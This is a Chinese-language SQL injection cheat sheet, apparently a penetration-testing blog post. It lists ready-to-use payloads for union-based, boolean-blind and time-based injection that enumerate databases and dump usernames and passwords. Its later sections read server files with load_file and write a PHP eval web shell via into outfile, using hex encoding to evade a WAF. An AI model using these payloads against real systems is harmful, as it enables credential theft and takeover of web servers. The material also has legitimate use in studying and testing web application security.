---
# 这是页面的图标
icon: token
# 这是文章的标题
title: SQL注入
# 设置作者
author: lhz
# 设置写作时间
time: 2021-08-18
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - SQL注入
comment: false
---
## 0x01 普通手动注入
 ### 1. 判断是否存在注入点
```sql
单引号， and 1=1 ，and 1=2 ，双引号，反斜杠，注释等
```
根据报错信息，返回内容判断是否存在sql注入
### 2. 判断是否存在注入点
逐步提高order by 1列号，出现错误时表示超过表的列数
```sql
order by 1 --
```
### 3. 判断字段的显示位
观察1，2，3的显示位置判断字段显示位
```sql
union select 1,2,3 --
```
### 4. 获取当前数据库信息
database(): 查看当前数据库名称
version(): 查看数据库版本信息
user(): 返回当前数据库连接使用的用户
可以使用group_concat()函数将多个字段连在一起当作一个字段中显示
```sql
union select 1,group_concat(database(),version()),3 --
```
### 5. 获取数据库中的表信息
ps：table_schema='数据库名'
```sql
union select 1,group_concat(char(32),table_name,char(32)),3 from information_schema.tables where table_schema='security' -- '
```
### 6.获取表中的列信息
```sql
union select 1,group_concat(char(32),column_name,char(32)),3 from information_schema.columns where table_name='users' -- '
```
### 7.获取数据
```sql
union select 1,group_concat(char(32),username,char(32),password),3 from users -- '
```

## 0x02 bool盲注
### 1.猜测长度
```sql
and length(database())>1 #
```
### 2.猜测库名
```sql
and ascii(substr(database(),1,1))>97 #
```
### 3.猜测表名
- 猜测表的数量
```sql
and (select count(table_name) from information_schema.tables where table_schema=database())=2#
```
- 猜测表的长度
```sql
and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #
```
- 获取表名
```sql
and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 #
```

### 4. 猜测字段长度
```sql
and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 #
```

### 5.猜测字段
```sql
and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>120 #
```

## 0x03 基于时间的盲注
### 1. 判断数据库长度
```sql
and if(length(database())=4,sleep(3),1) #
```
### 2. 猜测数据库名称
```sql
and if(ascii(substr(database(),1,1))>97,sleep(3),1)#
```
### 3. 猜测表的数量
```sql
and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)#
```
### 4. 猜测表名的长度
```sql
and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)#
```

### 5. 猜测字段
```sql
and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>120,sleep(5),1) #
```
## 0x04 其他函数
- MID(ColumnName, Start, Length]) - 用于从文本字段中提取字符
```sql
SELECT MID(column_name,start,length]) FROM table_name
```
- LEFT(str,len) - 返回字符串str的最左面len个字符
- ASCII(str) - 返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL
```sql
ascii(substr((select table_name from information_schema.tables where table_schema =database()limit 0,1),1,1))=101 –+
```
- CAST() - 将目标str转化为目标数据类型
```sql
SELECT CAST(’12’ AS int)     
```
- IFNULL(expr1,expr2) - 如果expr1不是NULL，IFNULL()返回expr1，否则它返回expr2
- LOAD_FILE
说明：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码
  ```sql
  -1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))
  ```
说明：“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”
  ```sql
  -1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)
  ```
将其他路径包含一句话木马的文件导出成php来链接
  ```sql
  select load_file('c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini') into outfile 'c:\\wamp\\www\\test.php'
  ```

## 0x05 读文件/写shell
  - union方式  
    ```sql
    -1 union select 1,user(),3 into outfile "C:\\test.txt" --+
    ```
  - 16进制写shell <    ?   eval($_POST[x]);?>可以过waf
    ```sql
    -1 union select 0x3c,0x3f,0x6576616C28245F504F53545B785D293B3F3E into outfile "C:\\test.php" --+
    ```
  - 分隔符写shell
  ```sql
  select * from admin where id=1 into outfile 'F:\WWW\phpinfo.php' fields terminated by '<? phpinfo(); ?>'%23     #分隔符也可以用16进制表示
  ```
  - 读文件
  ```sql
  select load_file('c:/boot.ini')
  ```
